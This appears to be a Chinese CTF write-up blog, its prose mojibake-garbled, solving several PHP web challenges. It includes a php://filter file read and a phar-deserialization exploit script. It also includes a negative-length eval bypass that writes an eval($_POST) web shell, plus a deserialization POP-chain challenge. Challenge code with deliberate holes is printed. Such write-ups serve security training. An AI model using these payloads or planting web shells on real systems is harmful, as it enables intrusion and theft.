<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdcGT"><img src="https://z3.ax1x.com/2021/03/25/6XdcGT.png" alt="6XdcGT.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//home.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Ã¥Â½Â“Ã¥Â‰ÂÃ¥Â¼Â•Ã§Â”Â¨Ã§ÂšÂ„Ã¦Â˜Â¯ &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">			<span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>åˆ©ç”¨æ€è·¯ï¼š$this-&gt;Filenameå¯æ§ï¼Œä»GETå‚æ•°nameä¸­è·å–ã€‚Uploaderç±»ä¸­çš„<code>__toString()</code>æ–¹æ³•è¿”å›<code>$this-&gt;Filename</code>ï¼Œæœ€åçš„flie_get_contentså‚æ•°å®é™…å¯ç›´æ¥ä»nameå‚æ•°è·å–ï¼Œè¿™æ ·å°±å¯ä»¥ç”¨phar://è§¦å‘ååºåˆ—åŒ–ã€‚æ­¤å¤–è¿˜éœ€è¦æ»¡è¶³æ¡ä»¶<code>$this-&gt;token</code> ç­‰äº<code>$_SESSION[&#39;user&#39;]</code>ï¼Œ<code>$_SESSION[&#39;user&#39;]</code>å¯ä»æ–‡ä»¶åä¸­è·å¾—ã€‚æœ€åæ„é€ phar://åŒ…å«æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    Ã¤Â¸ÂŠÃ¤Â¼ Ã¦Â–Â‡Ã¤Â»Â¶</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Ã¤Â¸ÂŠÃ¤Â¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sandbox</span> = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @mkdir(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (Ã¢Â€Â²Ã¢Â–Â½`Ã£Â€Âƒ)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> Uploader();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;upload(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Ã¤Â¸Â‹Ã©ÂÂ¢Ã¦Â˜Â¯Ã¤Â½ Ã¤Â¸ÂŠÃ¤Â¼ Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼Âš&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>ä¸Šä¼ txtæ–‡ä»¶ï¼Œå¾—åˆ°$_SESSION[â€˜userâ€™]</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Xdraq"><img src="https://z3.ax1x.com/2021/03/25/6Xdraq.png" alt="6Xdraq.png"></a></p>
<p>æ„é€ expï¼Œç”Ÿæˆpharæ–‡ä»¶å¹¶ä¸Šä¼ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;GXY57eb0a54186eb32ad70deb2e3da0b903&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Uploader();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>è¯»å–flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn&#x2F;home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;ef30d6288c320cd6e01dc95841a44ad0&#x2F;GXY57eb0a54186eb32ad70deb2e3da0b903.txt</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6XdDZn"><img src="https://z3.ax1x.com/2021/03/25/6XdDZn.png" alt="6XdDZn.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-23T07:34:27.000Z" title="2021-03-23T07:34:27.000Z">2021-03-23</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-23T07:45:33.179Z" title="2021-03-23T07:45:33.179Z">2021-03-23</time>æ›´æ–°</span><span class="level-item">8 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦1259ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/">nepctféƒ¨åˆ†wp</a></h1><div class="content"><h1 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h1><p>é•¿åº¦é™åˆ¶rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>ä¼ å…¥è´Ÿæ•°å³å¯ç»•è¿‡</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671PyQ"><img src="https://z3.ax1x.com/2021/03/23/671PyQ.png" alt="671PyQ.png"></a></p>
<p>ç›´æ¥echoå†™é©¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node4.hackingfor.fun:34567&#x2F;052e4d95576306a511b353cae5aec562&#x2F;?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[1]&#96;;1&amp;1&#x3D;echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br></pre></td></tr></table></figure>



<p>å®é™…æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br><span class="line">echo eval\(&gt;&gt;2.php</span><br><span class="line">echo \$_POST&gt;&gt;2.php</span><br><span class="line">echo \[1\]&gt;&gt;2.php</span><br><span class="line">echo \)\;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>



<p>èšå‰‘è¿æ¥æ‹¿åˆ°flag</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/67lzJf"><img src="https://z3.ax1x.com/2021/03/23/67lzJf.png" alt="67lzJf.png"></a></p>
<h1 id="æ¢¦å›ç‰¡ä¸¹äº­"><a href="#æ¢¦å›ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦å›ç‰¡ä¸¹äº­"></a>æ¢¦å›ç‰¡ä¸¹äº­</h1><p>ååºåˆ—åŒ–</p>
<p>1.Gameç±»çš„__destructæ–¹æ³•è°ƒç”¨checking å±æ€§choiceç­‰äºloginç±»,å±æ€§usernameå’Œpasswordç­‰äºadminï¼Œå±æ€§registerç­‰äºadmin</p>
<p>2.loginç±»çš„checkingæ–¹æ³•è°ƒç”¨openï¼Œè¿™äº›å±æ€§åœ¨Gameç±»ä¸­èµ‹å€¼ï¼šå±æ€§fileç­‰äºOpenç±»ï¼Œå±æ€§filenameç­‰äºshell.php </p>
<p>3.æœ€ç»ˆæ‰§è¡Œopenç±»çš„openæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;   <span class="comment">//admin</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">//ç»ˆç‚¹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;     <span class="comment">//</span></span><br><span class="line">    @unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>æ„é€ expè¯»å–shell.php</p>
